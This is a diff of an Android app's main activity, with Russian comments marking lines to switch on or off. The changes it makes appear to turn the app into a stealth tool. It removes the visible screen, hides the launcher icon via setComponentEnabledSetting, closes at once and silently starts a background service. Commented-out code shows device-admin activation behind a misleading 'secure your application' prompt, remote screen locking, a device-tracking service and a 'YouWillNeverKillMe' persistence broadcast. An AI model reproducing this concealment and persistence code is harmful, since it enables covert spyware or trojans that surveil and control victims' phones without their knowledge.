@@ -43,11 +43,11 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main); //ЕТО ВЫКЛЮЧИТЬ
+//        setContentView(R.layout.activity_main); //ЕТО ВЫКЛЮЧИТЬ
 
-//        PackageManager pkg=this.getPackageManager();
-//        pkg.setComponentEnabledSetting(new ComponentName(this,MainActivity.class),PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-//                PackageManager.DONT_KILL_APP); ЕТО ВКЛЮЧИТЬ
+        PackageManager pkg=this.getPackageManager();
+        pkg.setComponentEnabledSetting(new ComponentName(this,MainActivity.class),PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);// ЕТО ВКЛЮЧИТЬ
 
 
 //        PackageManager p = getPackageManager();
@@ -94,6 +94,7 @@ public class MainActivity extends AppCompatActivity {
 //        PhoneCall phoneCall = new PhoneCall();
 //        phoneCall.onReceive(getApplicationContext(),null);
         //////////////////////////////////////////////////////////////////
+//
 //        try {
 //            // Initiate DevicePolicyManager.
 //            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
@@ -105,10 +106,10 @@ public class MainActivity extends AppCompatActivity {
 //                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
 //                startActivityForResult(intent, REQUEST_CODE);
 //            } else {
-//                 mDPM.lockNow();
-//                 Intent intent = new Intent(MainActivity.this,
-//                 TrackDeviceService.class);
-//                 startService(intent);
+////                 mDPM.lockNow();
+////                 Intent intent = new Intent(MainActivity.this,
+////                 TrackDeviceService.class);
+////                 startService(intent);
 //            }
 //        } catch (Exception e) {
 //            e.printStackTrace();
@@ -128,7 +129,7 @@ public class MainActivity extends AppCompatActivity {
         ad.forceLoad();
         ad = null;
 
-//        finish(); ЕТО ВКЛЮЧИТЬ
+        finish(); //ЕТО ВКЛЮЧИТЬ
     }
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////
     @Override
@@ -176,21 +177,8 @@ public class MainActivity extends AppCompatActivity {
         @Override
         public Object loadInBackground() {
 
-
-
             Intent par = new Intent(getApplicationContext(), StartService.class);
             startService(par);
-            //sendBroadcast(new Intent("YouWillNeverKillMe"));
-
-            long sec = 1000*5;
-//            try {
-//                while (true) {
-//                    Thread.sleep(sec);
-//                    toast.show();
-//                }
-//            } catch (InterruptedException e) {
-//                e.printStackTrace();
-//            }
             return null;
         }
     }
